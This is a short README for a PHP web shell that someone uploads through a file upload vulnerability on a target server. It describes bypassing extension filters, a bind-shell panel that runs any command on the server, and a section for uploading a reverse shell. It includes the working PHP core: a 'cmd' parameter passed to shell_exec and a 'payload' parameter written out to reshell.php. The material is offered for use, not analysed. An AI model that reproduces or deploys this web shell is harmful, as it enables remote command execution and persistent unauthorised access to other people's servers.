# extra-web-shell

## What is this?
#### this is a simple web shell, contains both, bind and option of upload a reverse shell
![extra-shell](https://raw.githubusercontent.com/hamza07-w/extra-web-shell/main/backg.png)
## How can this help me?
#### well, sometimes when you find a file upload vulnerability, you will find that you can't bypass the extension eaisy, for example you have to try many extension methods such as, php, php5, jpg.php ... this extra web shell, will help you to upload any kind of files start from php, txt ...etc

## Bind shell section
#### this part of the tool, you can execute any command on the server without any problem, and the output will be visible in the output border

## Create file or reverse shell section
#### here you can upload any file just copy the content of this file and the output will give you the link of it to acssess
#### you can edit the name and the extension in the source code from $path variable which equal "reshell.php" by default to what you like
```php
<?php
	if(isset($_GET['cmd']))
	{
	    $output = shell_exec($_GET['cmd']);
	}
	elseif (isset($_GET['payload'])) {
		file_put_contents("reshell.php", $_GET['payload']);
		$path = "reshell.php";
	}	
?>

```

## LICENCE
[MIT](https://github.com/hamza07-w/extra-web-shell/blob/main/LICENSE)
